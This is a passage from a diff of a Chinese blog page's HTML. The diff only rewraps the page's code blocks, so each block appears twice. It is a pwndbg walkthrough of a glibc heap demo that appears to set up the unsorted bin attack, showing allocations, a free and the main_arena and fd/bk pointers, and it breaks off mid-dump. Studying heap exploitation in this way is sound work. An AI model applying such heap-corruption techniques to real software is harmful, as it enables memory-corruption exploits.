class="hljs-number">0x410</span>);<br>   <span class="hljs-number">13</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"一开始先申请一个比较正常的 chunk: %p\n"</span>,p);<br>   <span class="hljs-number">14</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"再分配一个避免与 top chunk 合并\n\n"</span>);<br>   <span class="hljs-number">15</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br>   <span class="hljs-number">16</span> <br>   <span class="hljs-number">17</span>     <span class="hljs-built_in">free</span>(p);<br>──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0x7fffffffdd70</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0x7fffffffdd78</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0x7fffffffdd80</span> —▸ <span class="hljs-number">0x7fffffffde70</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0x7fffffffdd88</span> ◂— <span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│ rbp  <span class="hljs-number">0x7fffffffdd90</span> —▸ <span class="hljs-number">0x400870</span> (__libc_csu_init) ◂— push   r15<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│      <span class="hljs-number">0x7fffffffdd98</span> —▸ <span class="hljs-number">0x7ffff7a2d840</span> (__libc_start_main+<span class="hljs-number">240</span>) ◂— mov    edi, eax<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0x7fffffffdda0</span> ◂— <span class="hljs-number">0x1</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0x7fffffffdda8</span> —▸ <span class="hljs-number">0x7fffffffde78</span> —▸ <span class="hljs-number">0x7fffffffe20d</span> ◂— <span class="hljs-string">'/home/ubuntu/Desktop/unsortedbin_demo/demo'</span><br>────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────<br> ► f <span class="hljs-number">0</span>           <span class="hljs-number">400722</span> main+<span class="hljs-number">124</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>看一下这时的本地变量情况：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x7fffffffde70</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;stack_var<br><span class="hljs-number">0x7fffffffdd78</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00007fffffffde70</span><br><span class="hljs-number">0x7fffffffdd88</span>:	<span class="hljs-number">0xbfb16d8983641800</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:	<span class="hljs-number">0x00007ffff7a2d840</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;p<br><span class="hljs-number">0x7fffffffdd80</span>:	<span class="hljs-number">0x00007fffffffde70</span>	<span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">0x7fffffffdd90</span>:	<span class="hljs-number">0x0000000000400870</span>	<span class="hljs-number">0x00007ffff7a2d840</span><br><span class="hljs-number">0x7fffffffdda0</span>:	<span class="hljs-number">0x0000000000000001</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x7fffffffde70</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;stack_var<br><span class="hljs-number">0x7fffffffdd78</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00007fffffffde70</span><br><span class="hljs-number">0x7fffffffdd88</span>:	<span class="hljs-number">0xbfb16d8983641800</span>	<span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:	<span class="hljs-number">0x00007ffff7a2d840</span><br>pwndbg&gt; x/<span class="hljs-number">5</span>gx &amp;p<br><span class="hljs-number">0x7fffffffdd80</span>:	<span class="hljs-number">0x00007fffffffde70</span>	<span class="hljs-number">0xbfb16d8983641800</span><br><span class="hljs-number">0x7fffffffdd90</span>:	<span class="hljs-number">0x0000000000400870</span>	<span class="hljs-number">0x00007ffff7a2d840</span><br><span class="hljs-number">0x7fffffffdda0</span>:	<span class="hljs-number">0x0000000000000001</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>从上面的代码框可以看到，此时：<br>● stack_var的值为0，此变量的地址为0x7fffffffdd78<br>● p的值为0x7fffffffde70，此变量的地址为0x7fffffffdd80</p>
 <h3 id="执行unsigned-long-p-x3D-malloc-0x410"><a href="#执行unsigned-long-p-x3D-malloc-0x410" class="headerlink" title="执行unsigned long *p=malloc(0x410);"></a>执行unsigned long *p=malloc(0x410);</h3><p>对代码的第13行下断点，让程序执行：unsigned long *p=malloc(0x410);  继续查看内存：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602420</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x602010</span><br>pwndbg&gt; x/<span class="hljs-number">160</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020be1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x6024f0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602420</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602420</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; info local<br>stack_var = <span class="hljs-number">0</span><br>p = <span class="hljs-number">0x602010</span><br>pwndbg&gt; x/<span class="hljs-number">160</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000020be1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x6024f0</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602420</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure></div>
 
 <h3 id="执行malloc-500"><a href="#执行malloc-500" class="headerlink" title="执行malloc(500);"></a>执行malloc(500);</h3><p>现在指针p指向malloc_data，紧接着对代码的第17行下断点让程序执行：malloc(500);，继续查看内存：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602620</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena <br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; x/<span class="hljs-number">300</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000201</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602620</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00000000000209e1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x602950</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk<br>Addr: <span class="hljs-number">0x602000</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; top_chunk<br>Top chunk<br>Addr: <span class="hljs-number">0x602620</span><br>Size: <span class="hljs-number">0x00</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena <br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt; x/<span class="hljs-number">300</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602420</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000201</span> #malloc_chunk1<br>......（省略内容均为空）<br><span class="hljs-number">0x602620</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x00000000000209e1</span> #top_chunk<br>......（省略内容均为空）<br><span class="hljs-number">0x602950</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>此处又malloc一个空间是为了避免malloc_chunk1与top_chunk相邻而导致的在free chunk1时不回收到unsortedbin。</p>
 <blockquote>
 <p><strong>释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。</strong></p>
 </blockquote>
 <h3 id="执行free-p"><a href="#执行free-p" class="headerlink" title="执行free(p)"></a>执行free(p)</h3><p>对代码的第18行下断点，程序将会执行：free(p);  继续运行程序，查看内存：</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span> <span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br>    		<span class="hljs-meta">#fd					#bk</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br>......(省略内容均为空)<br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602620</span> <br> 													#指向top_chunk<br>													<span class="hljs-meta">#unsortedbin指向的地方</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602000</span> <br>    												<span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x0000000000602000</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b88</span>	<span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b98</span>	<span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1ba8</span>	<span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bb8</span>	<span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bc8</span>	<span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1bd8</span>	<span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1be8</span>	<span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> ◂— <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x602000</span> —▸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) ◂— <span class="hljs-number">0x602000</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x602000</span><br><span class="hljs-number">0x602000</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000421</span> <span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x602010</span>:	<span class="hljs-number">0x00007ffff7dd1b78</span>	<span class="hljs-number">0x00007ffff7dd1b78</span><br>    		<span class="hljs-meta">#fd					#bk</span><br><span class="hljs-number">0x602020</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602030</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602040</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602050</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602060</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:	<span class="hljs-number">0x0000000100000000</span>	<span class="hljs-number">0x0000000000000000</span><br>......(省略内容均为空)<br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602620</span> <br> 													#指向top_chunk<br>													<span class="hljs-meta">#unsortedbin指向的地方</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:	<span class="hljs-number">0x0000000000000000</span>	<span class="hljs-number">0x0000000000602000</span> <br>    												<span class="hljs-meta">#unsortedbin</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:	<span class="hljs-number">0x0000000000602000</span>	<span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b88</span>	<span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:	<span class="hljs-number">0x00007ffff7dd1b98</span>	